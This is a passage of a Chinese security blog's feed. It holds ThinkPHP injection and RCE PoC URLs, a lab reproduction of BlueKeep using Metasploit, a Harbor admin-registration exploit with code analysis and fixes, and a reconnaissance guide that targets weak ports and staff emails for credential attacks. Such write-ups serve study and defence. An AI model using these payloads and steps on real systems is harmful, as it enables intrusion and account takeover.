class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;testsql?order[id`|updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,user()),<span class="number">1</span>)%<span class="number">23</span>]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/2018-08-23.png" alt="img"></p></blockquote><h4 id="ThinkPHP5-X-远程代码执行"><a href="#ThinkPHP5-X-远程代码执行" class="headerlink" title="ThinkPHP5.X_远程代码执行"></a>ThinkPHP5.X_远程代码执行</h4><table><thead><tr><th>标题</th><th>ThinkPHP5.X 远程代码执行</th></tr></thead><tbody><tr><td>时间</td><td>2018-12-10</td></tr><tr><td>版本</td><td>5.0.5-5.0.22<br>5.1.0-5.1.30</td></tr><tr><td>文章链接</td><td><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">https://xz.aliyun.com/t/3570</a><br><a href="https://paper.seebug.org/760/" target="_blank" rel="noopener">https://paper.seebug.org/760/</a><br><a href="https://paper.seebug.org/770" target="_blank" rel="noopener">https://paper.seebug.org/770</a></td></tr></tbody></table><blockquote><p>测试方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;git checkout 4fefa5e</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">//...无需实际代码</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;index?s=index/\think\container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2020/05/12/ThinkPHP-%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8/2018-12-10.png" alt="img"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ThinkPHP漏洞，很久之前看到的，忘记是哪位老哥整理的了，我也添加了一些，做个记录（陆续会添加）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞笔记" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ThinkPHP" scheme="http://yoursite.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>我的2019</title>
    <link href="http://yoursite.com/2020/01/10/%E6%88%91%E7%9A%842019/"/>
    <id>http://yoursite.com/2020/01/10/%E6%88%91%E7%9A%842019/</id>
    <published>2020-01-10T00:43:14.000Z</published>
    <updated>2020-01-10T01:54:05.190Z</updated>
    
    <content type="html"><![CDATA[<p>2019与2020的约会</p><a id="more"></a><h2 id="这一年"><a href="#这一年" class="headerlink" title="这一年"></a>这一年</h2><p>2019年，人生变化最大的一年，这一年好像很忙碌的样子，但似乎又没做啥事！七月份，我毕业了，不再是一个大学生了，</p><p>一入职场，感觉自己变了很多，人的沟通交流似乎变得更加重要，我要学会与人交流，热心帮助同事….</p><p>似乎，我做的还有很多很多…</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>2020年，需要学习的更多，学会python，不要求学好！！最好看完两本书，学会其中的知识，理解透！！慢慢享受生活！！与我家皮古去一趟北京？似乎还可以！！</p><h2 id="享受生活，热爱生活"><a href="#享受生活，热爱生活" class="headerlink" title="享受生活，热爱生活"></a>享受生活，热爱生活</h2><p><img src="/2020/01/10/%E6%88%91%E7%9A%842019/1.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2019与2020的约会&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708复现</title>
    <link href="http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-27T03:38:10.000Z</published>
    <updated>2020-01-10T00:36:12.382Z</updated>
    
    <content type="html"><![CDATA[<p>BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。</p><a id="more"></a><h3 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h3><p>目标机：Windows 2007 X64    192.168.30.129<br>攻击机：kali    192.168.30.128</p><p>windows配置<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/1.jpg" alt="1"></p><p>kali 配置 - MSF下替换文件<br>EXP下载地址：<a href="https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip" target="_blank" rel="noopener">https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip</a>  </p><p>cve_2019_0708_bluekeep_rce.rb 添加 /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb  </p><p>rdp.rb 替换 /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb<br>rdp_scanner.rb 替换 /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb  </p><p>cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb  </p><p>root@kali:~# msfconsole<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/2.jpg" alt="2"></p><p>msf5 &gt; reload_all    #重新加载所有模块<br>msf5 &gt; search cve_2019_0708<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/3.jpg" alt="3"></p><p>msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; info<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/4.jpg" alt="4"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set RHOSTS 192.168.30.129<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/5.jpg" alt="5"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set target 3<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/6.jpg" alt="6"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;show options<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/7.jpg" alt="7"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;run<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/8.jpg" alt="8"></p><p>执行whoami<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/9.jpg" alt="9"></p><h3 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h3><p>这种情况是把虚拟机打蓝屏了，此时，关机重启，多试几次。哈哈哈哈哈！（鬼知道我打蓝屏了多少次）<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/10.jpg" alt="10"><br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/11.jpg" alt="11"></p><p>修复建议：<br>安装微软为2019-0708推出的专用补丁：<br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Harbor任意管理员注册漏洞(CVE-2019-16097)复现</title>
    <link href="http://yoursite.com/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-27T03:16:35.000Z</published>
    <updated>2020-01-10T00:37:06.705Z</updated>
    
    <content type="html"><![CDATA[<p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，提供了良好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等</p><a id="more"></a><h2 id="漏洞简介及影响范围"><a href="#漏洞简介及影响范围" class="headerlink" title="漏洞简介及影响范围"></a>漏洞简介及影响范围</h2><p>Harbor 1.7.6之前版本和Harbor 1.8.3之前版本中的core/api/user.go文件存在安全漏洞。若开放注册功能，攻击者可利用该漏洞创建admin账户。注册功能默认开放。攻击者可以以管理员身份下载私有项目并审计；可以删除或污染所有镜像。</p><p>目前PoC已公开，建议受影响的客户尽快升级。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>（1）搭建好环境</p><p>（2）注册页面，输入必要信息，<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><p>（3）然后抓包，改包，在最后数据包加上：”has_admin_role”:true<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p><p>（4）注册成功，登录之后，是管理员权限<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>声明：代码分析来自于奇安信团队，原文地址：<a href="https://mp.weixin.qq.com/s/PGkuysZwbIlIc5DWARUxcw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/PGkuysZwbIlIc5DWARUxcw</a><br>分析代码的commit hash为e7488e37b69319fa9dcbaab57499bec5c8aed08a，此commit中尚未包含补丁。受影响的API请求地址是/api/users/，请求方式为POST，因此从API的路由中找到入口点，位置在src/core/router.go50行：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><p>可以看到其将此POST请求路由到了api.UserAPI中，找到api.UserAPI的处理POST请求的位置在src/core/api/user.go的302行，跟进代码，发现其先后判断认证方式，是否开启自行注册（默认开启）然后实例化了User结构体：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p><p>我们先来看一下User结构体，位置在src/common/models/user.go 25行：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p><p>注意其中HasAdminRole字段对应的数据库表现形式和JSON请求表现形式。其在数据库中的字段表现形式为sysadmin_flag，JSON表现形式为has_admin_role<br>再继续跟入，后面的过程依次是，反序列化请求JSON串为User结构体，验证用户提交的User格式是否正确（用户名规范和密码规范）判断用户名和email字段是否已存在，然后直接调用数据库访问层的dao.Register()方法执行数据库插入的操作：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p><p>跟入dao.Register()方法中，位置在src/common/dao/register.go26行，可以看到其直接将User结构体的HasAdminRole字段插入到数据库。<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p><p>由于整个过程没有对携带了has_admin_role字段的请求进行权限校验，导致用户可以直接通过此API设置一个新用户为管理员权限。</p><p>在github上进行commitdiff（<a href="https://github.com/goharbor/harbor/pull/8917/commits/b6db8a8a106259ec9a2c48be8a380cb3b37cf517#diff-fb70049a82e5abd89a68c8e2cccba44c）对比，可以看到此次提交对注册用户的请求进行了逻辑判断，不允许非管理员用户创建新的管理员用户。" target="_blank" rel="noopener">https://github.com/goharbor/harbor/pull/8917/commits/b6db8a8a106259ec9a2c48be8a380cb3b37cf517#diff-fb70049a82e5abd89a68c8e2cccba44c）对比，可以看到此次提交对注册用户的请求进行了逻辑判断，不允许非管理员用户创建新的管理员用户。</a><br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>升级到1.7.6及以上版本或者1.8.3及以上版本<br>关闭自行注册功能</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，提供了良好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>我的博客</title>
    <link href="http://yoursite.com/2019/11/27/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2019/11/27/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</id>
    <published>2019-11-27T03:02:39.000Z</published>
    <updated>2019-11-27T03:12:28.293Z</updated>
    
    <content type="html"><![CDATA[<p>在您浏览本博客的内容前，请仔细阅读本篇内容！谢谢</p><a id="more"></a><p>为了记录一些笔记，方便自己记忆，也为了后来人少走一些坑，开启了我的个人博客！</p><p>由于某些不可抗拒的因素，也为了避免不必要的麻烦，特此声明：</p><ul><li>由于传播、利用本博客所提供的信息而造成的任何直接或间接的后果及损失，均由使用者本人负责，博主不承担任何责任。</li><li>博主拥有对本博客所有内容的修改和解释权。如欲转载或传播文章，必须保证文章的完整性，包括版权声明等全部内容。未经博主允许，不得任意修改或者增减文章内容，不得以任何方式将其用于商业目的。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在您浏览本博客的内容前，请仔细阅读本篇内容！谢谢&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>信息收集思路总结</title>
    <link href="http://yoursite.com/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</id>
    <published>2019-11-22T09:37:27.000Z</published>
    <updated>2020-01-10T00:36:51.789Z</updated>
    
    <content type="html"><![CDATA[<p>信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。最简单的比如说目标站点的IP、中间件、脚本语言、端口、邮箱等等。我觉得信息收集在我们渗透测试的过程当中，是最重要的一环，这一环节没做好，没收集到足够多的可利用的信息，我们很难进行下一步的操作。</p><a id="more"></a><p>信息收集主要收集什么呢？该如何进行收集呢？</p><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><p>很多网站上都可以收集到whois信息，比如说</p><p>国外的who.is：<a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br>站长之家：<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br>爱站：<a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a><br>微步：<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> </p><p>这些网站都可以收集whois信息，而且还很全面，我主要关注：注册商、注册人、邮件、DNS解析服务器、注册人联系电话。<br>有需要的还可以查企业的备案信息，主要有三种方式</p><p>天眼查：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a><br>ICP备案查询网：<a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a><br>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a>   </p><p>注意：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/1.png" alt="1"></p><ul><li>小技巧：如果在站长之家上隐藏了信息，可在 who.is 上再次查看  </li></ul><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>子域名是在顶级域名下的域名，收集的子域名越多，我们测试的目标就越多，渗透的成功率也越大。往往在主站找不到突破口的时候，我们从子域名入手，有时候可能会发现惊喜！<br>大佬们都有自己用的顺手的一套方法或工具  </p><p>我就简单收集了一些  </p><ul><li><p>1、Google语法<br>可以利用Google和Bing这样的搜索引擎进行搜索查询（site:<a href="http://www.xxx.com）" target="_blank" rel="noopener">www.xxx.com）</a><br>Google还支持额外的减号运算符，以排除我们对“网站:wikimedia.org -www -store ”不感兴趣的子域名。<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/2.png" alt="2"></p></li><li><p>2、有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。<br>（1）VirusTotal：<a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">https://www.virustotal.com/#/home/search</a><br>（2）DNSdumpster：<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a><br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/3.png" alt="3"></p></li><li><p>3、基于SSL证书查询<br>查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。前两种比较常用。<br>（1）<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a><br>（2）<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a><br>（3）<a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a><br>（4）<a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a><br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/4.png" alt="4"></p></li><li><p>4、简单的在线子域名收集（不推荐）<br>（1）<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a><br>（2）<a href="http://i.links.cn/subdomain/" target="_blank" rel="noopener">http://i.links.cn/subdomain/</a>  </p></li><li><p>5、爆破枚举<br>这个就有很多工具可以用了，大佬们都有自己用的顺手的工具，比较常见的是：<br>（1）layer子域名挖掘机<br>（2）subDomainsBrute<br>（3）K8<br>（4）orangescan<br>（5）DNSRecon<br>这里重点推荐 subDomainsBrute 工具，可以从子域名入侵到主站。  </p></li><li><p>小技巧：在 <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a> 上也可以搜索子域名，运气好的话，会有意想不到的收获。  </p></li></ul><h2 id="IP段的收集"><a href="#IP段的收集" class="headerlink" title="IP段的收集"></a>IP段的收集</h2><p>一般IP的话，我们在收集子域名的时候，就大概知道目标网站的IP段了。<br>也可以通过whois命令获取。即通过中国互联网信息中心 <a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a> 进行查询<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/4.png" alt="5"></p><h2 id="开放端口探测"><a href="#开放端口探测" class="headerlink" title="开放端口探测"></a>开放端口探测</h2><p>很多时候，网站都会开启CDN加速，导致我们查询到的IP不是真实的IP，所以得先查询到真实的IP地址。方法有很多，百度一大把。就说我觉得最准确的几种方法吧！<br>（1）通过让服务器给你发邮件(看邮箱头源 ip )找真实 ip（最可靠）。<br>（2）通过 zmpap 全网爆破查询真实 ip（可靠）。<br>（3）通过查询域名历史 ip，<a href="http://toolbar.netcraft.com" target="_blank" rel="noopener">http://toolbar.netcraft.com</a> （借鉴）。<br>（4）通过国外冷门的 DNS 的查询：nslookup xxx.com  国外冷门 DNS 地址 （借鉴）。  </p><p>收集到大量IP，那就要进行端口扫描了，看看有什么常见的漏洞。<br>最常用的就是神器Nmap了。命令：nmap -sS -Pn -p- -vv ip –script=defaultip<br>端口服务对应图：<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/6.png" alt="6"></p><p>常见端口漏洞：<br>端口    服务    说明<br>21    FTP    主要看是否支持匿名，也可跑弱口令<br>22    SSH    弱口令爆破<br>23    telnet    弱口令爆破<br>80-90    WEB    常见WEB漏洞以及一些为管理后台<br>161    snmp    public弱口令<br>389    ldap    是否为匿名访问<br>443    openssl    心脏出血以及一些WEB漏洞测试<br>445    smb    跑弱口令，检测是否有ms_08067等溢出<br>873    rsync    是否为匿名访问，也可以跑弱口令<br>1025    RPC    NFS匿名访问<br>1099    java rmi    远程命令执行漏洞<br>1433    mssql    弱口令爆破<br>1521    oracle    弱口令爆破<br>2082/2083    cpanel主机管理系统登陆    弱口令爆破<br>2222    DA虚拟主机管理系统登陆    弱口令爆破<br>2601,2604    zebra路由器    默认密码zebra<br>3128    squid代理默认端口    如果没设置口令很可能 就直接漫游内网<br>3306    mysql    弱口令爆破<br>3312/3311    kangle主机管理系统登陆    说明<br>3389    RDP    弱口令爆破，SHIFT后门，放大镜，输入法漏洞<br>4440    rundeck    web<br>4848    GlassFish    web中间件 弱口令admin/adminadmin<br>5432    postgres    弱口令爆破<br>5560,7778    iSqlPlus<br>5900,5901,5902    vnc    弱口令爆破<br>5984    CouchDB<br>6082    varnish<br>6379    redis    一般无验证，直接访问<br>7001,7002    weblogic    弱口令爆破<br>7778    Kloxo主机控制面板登录<br>8080    tomcat\jboss    弱口令爆破，jboss后台可能不验证<br>8649    ganglia<br>8080-8090    常见WEB端口<br>8083    Vestacp主机管理系统 （国外用较多）<br>8649    ganglia<br>8888    amh/LuManager 主机管理系统默认端口    说明<br>9000    fcgi    fcgi php命令执行漏洞<br>9200    elasticsearch    代码执行<br>9043    websphere    弱口令爆破<br>10000    Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211    memcache    内存泄露<br>27017,28017    mongodb    未授权访问<br>50000    Upnp    SAP命令执行<br>50060,50030    hadoop    WEB    未授权访问  </p><p>常见端口列表整理如下：<br>21,22,23,80-90,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2601,2604,3128,3306,3311,3312,3389,4440,4848,5432,5560,5900,5901,5902,6082,6379,7001-7010,7778,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,50030,50060</p><h2 id="网站架构探测"><a href="#网站架构探测" class="headerlink" title="网站架构探测"></a>网站架构探测</h2><p>当我们探测目标站点网站架构时，比如说：操作系统，中间件，脚本语言，数据库，服务器，web容器等等，可以使用以下方法查询。<br>（1）wappalyzer插件 ——火狐插件<br>（2）云悉：<a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">http://www.yunsee.cn/info.html</a><br>（3）查看数据包响应头<br>（4）CMS指纹识别：<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br>CMS指纹识别又有很多方法，比如说御剑指纹识别、Webrobot工具、whatweb工具、还有在线查询的网站等等。<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/7.png" alt="7"></p><h2 id="敏感文件、敏感目录探测"><a href="#敏感文件、敏感目录探测" class="headerlink" title="敏感文件、敏感目录探测"></a>敏感文件、敏感目录探测</h2><p>通常我们所说的敏感文件、敏感目录大概有以下几种：<br>（1）Git<br>（2）hg/Mercurial<br>（3）svn/Subversion<br>（4）bzr/Bazaar<br>（5）Cvs<br>（6）WEB-INF泄露<br>（7）备份文件泄露、配置文件泄露  </p><p>敏感文件、敏感目录挖掘一般都是靠工具、脚本来找，当然大佬手工也能找得到。<br>常用的工具有：<br>（1）御剑（真的很万能，文末附上全家桶）<br>（2）爬虫（AWVS、Burpsuite等）<br>（3）搜索引擎（Google、Github等）<br>（4）wwwscan<br>（5）BBscan（一位巨佬写的python脚本：<a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> ）<br>（6）GSIL（也是一位巨佬写的python脚本：<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a> ）<br>（7）社交平台（有事没事多加一些QQ群）  </p><h2 id="目标域名邮箱收集"><a href="#目标域名邮箱收集" class="headerlink" title="目标域名邮箱收集"></a>目标域名邮箱收集</h2><p>一定要养成收集站点邮箱账号收集的习惯（因为好多官方后台都是用内部邮箱账号登录的，指不定哪天你就得到一个进后台的机会）。<br>（1）通过说明文档以及网站页面收集，或者网站发表者以及留言板信息处收集账号<br>（2）通过 teemo，metago，burpusit，awvs，netspker 或者 google 语法收集<br>（3）搜索相关 QQ 群收集相关企业员工的社交账号<br>用途： 可用来进行爆破或者弱口令登录以及撞裤攻击。  </p><h2 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h2><p>Waf也叫Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。Waf的探测很多人都会忽略掉，其实当我们遇到Waf，第一想法是溜了溜了、告辞告辞（我是这样，别赞，要脸）。但当我们知道是什么Waf时，又有种去绕过它的冲动，很多大牛都喜欢挑战Waf，于是网上就出现了很多绕过Waf的教学视频。毕竟成功绕过之后的那种自豪感真的真的很舒服。<br>我常用的两种方式：<br>（1）手工（提交恶意数据，简单粗暴）<br>（2）Kaili工具（WAFW00F、Nmap）  </p><p>Nmap探测WAF有两种脚本，<br>&nbsp; &nbsp; &nbsp;一种是http-waf-detect，命令：nmap  -p80,443  –script=http-waf-detect  ip<br>&nbsp; &nbsp; &nbsp; 一种是http-waf-fingerprint。命令：nmap  -p80,443  –script=http-waf-fingerprint  ip  </p><p>WAFW00F 探测 WAF 命令：wafw00f  -a  域名<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/8.png" alt="8"></p><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C端：是和目标服务器ip处在同一个C段的其它服务器。<br>旁站和C段的查询方式：<br>（1）利用Bing.com，语法为：<a href="http://cn.bing.com/search?q=ip:111.111.111.111" target="_blank" 